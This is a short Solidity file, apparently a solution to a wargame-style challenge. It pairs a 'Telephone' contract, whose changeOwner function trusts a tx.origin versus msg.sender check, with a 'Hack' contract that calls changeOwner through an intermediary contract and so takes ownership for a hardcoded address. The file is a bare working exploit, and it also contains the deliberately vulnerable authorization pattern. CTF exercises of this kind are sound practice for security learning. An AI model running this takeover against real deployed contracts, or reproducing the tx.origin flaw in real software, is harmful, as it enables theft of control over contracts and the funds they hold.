pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Hack{
    Telephone tel;
    
    function hack(address _addr) public{
        tel = Telephone(_addr);
        tel.changeOwner(address(0xDC8dA71cA6aA535fBFCAD46bF0d7dB25dE446258));
    }
}